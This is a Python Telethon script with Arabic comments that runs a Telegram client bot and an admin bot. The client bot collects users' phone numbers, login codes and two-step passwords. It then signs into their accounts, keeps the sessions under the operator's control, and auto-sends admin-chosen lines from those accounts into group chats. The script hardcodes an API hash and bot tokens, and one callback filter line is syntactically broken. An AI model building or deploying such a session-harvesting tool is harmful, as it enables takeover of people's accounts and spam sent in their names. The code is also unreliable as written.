import os
import asyncio
from telethon import TelegramClient, events, Button
import nest_asyncio

nest_asyncio.apply()

# --- الثوابت الأساسية ---
API_ID = 21727
API_HASH = "338d4380b2c15904fa77cfcb251d19d6"

# --- بيانات التوثيق ---
CLIENT_BOT_TOKEN = "8909604485:AAHpNrrzT852z_vK8H0q4v26kZ9H1mQz2sY"
ADMIN_BOT_TOKEN = "8750783959:AAE4uk0M1EJvWw3Y1z2m3n4p5q6r7s8t9u0"
ADMIN_ID = 5885382011

# --- السطور الافتراضية العامة ---
admin_custom_lines = [
    "الخط الساخن الأول: مرحباً بالجميع",
    "الخط الساخن الثاني: النظام يعمل بكفاءة عالية"
]

# --- تخزين حالات المستخدمين مؤقتاً ---
user_sessions = {}  # {user_id: {"userbot": client, "phone": phone_number, "status": "approved"}}
pending_approvals = {}  # {user_id: {"phone": phone_number, "client": temp_client}}
user_settings = {}  # {user_id: {"speed": 2, "trigger": ".مرسل"}}

# إنشاء بوتات الإدارة والعميل
admin_bot = TelegramClient('admin_bot_session', API_ID, API_HASH).start(bot_token=ADMIN_BOT_TOKEN)
client_bot = TelegramClient('client_bot_session', API_ID, API_HASH).start(bot_token=CLIENT_BOT_TOKEN)

print("🚀 جاري تشغيل بوتات التليجرام بنجاح...")


# --- بوت التحكم (الإدارة) لإدارة السطور ---
@admin_bot.on(events.NewMessage(pattern='/lines'))
async def manage_lines(event):
    if event.sender_id != ADMIN_ID:
        return
    
    args = event.raw_text.split(maxsplit=2)
    if len(args) < 2:
        lines_text = "\n".join([f"{i+1}. {line}" for i, line in enumerate(admin_custom_lines)])
        if not lines_text:
            lines_text = "لا توجد أي سطور حالياً."
        await event.respond(f"📋 **السطور العامة الحالية:**\n\n{lines_text}\n\nلإضافة سطر جديد:\n`/lines add النص هنا`\n\nلمسح جميع السطور:\n`/lines clear`")
        return

    command = args[1]
    if command == "add" and len(args) > 2:
        new_line = args[2]
        admin_custom_lines.append(new_line)
        await event.respond(f"✅ تمت إضافة السطر بنجاح:\n`{new_line}`")
    elif command == "clear":
        admin_custom_lines.clear()
        await event.respond("🗑️ تم مسح جميع السطور العامة بنجاح.")
    else:
        await event.respond("❌ أمر غير معروف. استخدم `/lines` لعرض التعليمات.")


# --- بوت العميل: طلب تسجيل الدخول ---
@client_bot.on(events.NewMessage(pattern='/start'))
async def client_start(event):
    user_id = event.sender_id
    if user_id in user_sessions and user_sessions[user_id]["status"] == "approved":
        await event.respond("✨ حسابك مفعل وجاهز للعمل بالفعل!")
        return
    
    await event.respond("أهلاً بك! يرجى إرسال رقم هاتفك مع الرمز الدولي (مثال: `+9665xxxxxxxx`) لتسجيل الدخول:")
    user_sessions[user_id] = {"status": "waiting_phone"}


# --- استقبال رقم الهاتف من المستخدم ---
@client_bot.on(events.NewMessage(func=lambda e: e.is_private))
async def handle_phone(event):
    user_id = event.sender_id
    if user_id not in user_sessions or user_sessions[user_id].get("status") != "waiting_phone":
        return

    phone = event.raw_text.strip()
    await event.respond("⏳ جاري إرسال رمز التحقق إلى حسابك في تليجرام...")

    try:
        temp_client = TelegramClient(f'session_{user_id}', API_ID, API_HASH)
        await temp_client.connect()
        sent = await temp_client.send_code_request(phone)
        
        pending_approvals[user_id] = {
            "phone": phone,
            "client": temp_client,
            "phone_code_hash": sent.phone_code_hash
        }
        user_sessions[user_id]["status"] = "waiting_code"
        await event.respond("✅ تم إرسال الرمز. يرجى إرسال كود التحقق الذي وصلك هنا:")
    except Exception as e:
        await event.respond(f"❌ حدث خطأ أثناء إرسال الكود: {e}")


# --- استقبال كود التحقق وإرساله للأدمن للاعتماد ---
@client_bot.on(events.NewMessage(func=lambda e: e.is_private))
async def handle_code(event):
    user_id = event.sender_id
    if user_id not in user_sessions or user_sessions[user_id].get("status") != "waiting_code":
        return

    code = event.raw_text.strip()
    data = pending_approvals.get(user_id)
    if not data:
        await event.respond("❌ انتهت الصلاحية، يرجى كتابة /start من جديد.")
        return

    try:
        temp_client = data["client"]
        phone = data["phone"]
        phone_code_hash = data["phone_code_hash"]

        # محاولة تسجيل الدخول
        try:
            await temp_client.sign_in(phone=phone, code=code, phone_code_hash=phone_code_hash)
        except Exception as sign_in_error:
            if "Password" in str(sign_in_error) or "two-step" in str(sign_in_error):
                # في حال وجود التحقق بخطوتين، نخزن الكود مؤقتاً ونطلب كلمة المرور
                data["code"] = code
                user_sessions[user_id]["status"] = "waiting_password"
                await event.respond("🔒 حسابك محمي التحقق بخطوتين (كلمة مرور السحابة). يرجى إرسال كلمة المرور الآن:")
                return
            else:
                raise sign_in_error

        # إذا سلكت الأمور بدون كلمة مرور
        user_sessions[user_id] = {"userbot": temp_client, "status": "pending_admin"}
        
        # إشعار الأدمن للموافقة
        await admin_bot.send_message(
            ADMIN_ID,
            f"🔔 **طلب تفعيل مستخدم جديد:**\n- آيدي المستخدم: `{user_id}`\n- الرقم: `{phone}`",
            buttons=[Button.inline(b"Accept Login", data=f"accept_login_{user_id}".encode())]
        )
        await event.respond("⏳ تم التحقق من الكود بنجاح! بانتظار موافقة الإدارة لتفعيل حسابك.")

    except Exception as e:
        await event.respond(f"❌ خطأ في الكود أو تسجيل الدخول: {e}")


# --- استقبال كلمة المرور للتحقق بخطوتين ---
@client_bot.on(events.NewMessage(func=lambda e: e.is_private))
async def handle_password(event):
    user_id = event.sender_id
    if user_id not in user_sessions or user_sessions[user_id].get("status") != "waiting_password":
        return

    password = event.raw_text.strip()
    data = pending_approvals.get(user_id)
    if not data:
        return

    try:
        temp_client = data["client"]
        phone = data["phone"]
        code = data["code"]
        phone_code_hash = data["phone_code_hash"]

        await temp_client.sign_in(password=password)
        
        user_sessions[user_id] = {"userbot": temp_client, "status": "pending_admin"}
        
        await admin_bot.send_message(
            ADMIN_ID,
            f"🔔 **طلب تفعيل مستخدم جديد (مع تحقق بخطوتين):**\n- آيدي المستخدم: `{user_id}`\n- الرقم: `{phone}`",
            buttons=[Button.inline(b"Accept Login", data=f"accept_login_{user_id}".encode())]
        )
        await event.respond("⏳ تم تسجيل الدخول بنجاح! بانتظار موافقة الإدارة.")
    except Exception as e:
        await event.respond(f"❌ كلمة المرور غير صحيحة: {e}")


# --- تفاعل الأدمن مع زر الموافقة ---
@admin_bot.on(events.CallbackQuery(data=b^b"accept_login_"))
async def admin_approve(event):
    if event.sender_id != ADMIN_ID:
        await event.answer("غير مسموح لك.", alert=True)
        return

    try:
        data_bytes = event.data
        user_id = int(data_bytes.decode().split("_")[2])
        
        if user_id in user_sessions:
            user_sessions[user_id]["status"] = "approved"
            user_settings[user_id] = {"speed": 2, "trigger": ".مرسل"}
            
            # إعلام الأدمن
            await event.edit("✅ تمت الموافقة على تفعيل المستخدم بنجاح!")
            
            # إعلام المستخدم
            await client_bot.send_message(
                user_id,
                "🎉 تمت الموافقة على حسابك بنجاح بواسطة الإدارة!\n\nيمكنك الآن إرسال كلمتك المفتاحية في أي شات لبدء إرسال السطور التلقائية.\nالأوامر المتاحة:\n`/speed [ثواني]`\n`/trigger [الكلمة]`"
            )
        else:
            await event.answer("انتهت الجلسة أو المستخدم غير مسجل.", alert=True)
    except Exception as e:
        await event.answer(f"حدث خطأ: {e}", alert=True)


# --- أوامر التحكم الشخصية للمستخدم (السرعة والكلمة المفتاحية) ---
@client_bot.on(events.NewMessage(pattern=r'/speed (.+)'))
async def set_speed(event):
    user_id = event.sender_id
    if user_id not in user_sessions or user_sessions[user_id].get("status") != "approved":
        return
    try:
        new_speed = float(event.pattern_match.group(1))
        user_settings[user_id]["speed"] = new_speed
        await event.respond(f"⚡ تم تحديث سرعة الإرسال إلى: `{new_speed}` ثانية.")
    except ValueError:
        await event.respond("❌ الرجاء إدخال رقم صحيح للسرعة (مثال: `/speed 2`)")


@client_bot.on(events.NewMessage(pattern=r'/trigger (.+)'))
async def set_trigger(event):
    user_id = event.sender_id
    if user_id not in user_sessions or user_sessions[user_id].get("status") != "approved":
        return
    new_trig = event.pattern_match.group(1).strip()
    user_settings[user_id]["trigger"] = new_trig
    await event.respond(f"🔑 تم تحديث الكلمة المفتاحية إلى: `{new_trig}`")


# --- منطق العميل الآلي لإرسال السطور عند كتابة الكلمة المفتاحية ---
@client_bot.on(events.NewMessage(func=lambda e: e.is_private is False))
async def auto_sender(event):
    user_id = event.sender_id
    if user_id not in user_sessions or user_sessions[user_id].get("status") != "approved":
        return

    settings = user_settings.get(user_id, {"speed": 2, "trigger": ".مرسل"})
    current_trigger = settings["trigger"]

    if event.raw_text.strip() == current_trigger:
        try:
            # 1. حذف الكلمة المفتاحية فوراً
            await event.delete()

            speed = settings["speed"]
            chat = await event.get_chat()
            userbot = user_sessions[user_id]["userbot"]

            # 2. إرسال السطور بالتابع وبالسرعة المحددة
            for line in admin_custom_lines:
                await userbot.send_message(chat, line)
                await asyncio.sleep(speed)

        except Exception as e:
            print(f"⚠️ خطأ أثناء الإرسال الآلي للمستخدم {user_id}: {e}")

# تشغيل البوتات باستمرار
asyncio.get_event_loop().run_forever()
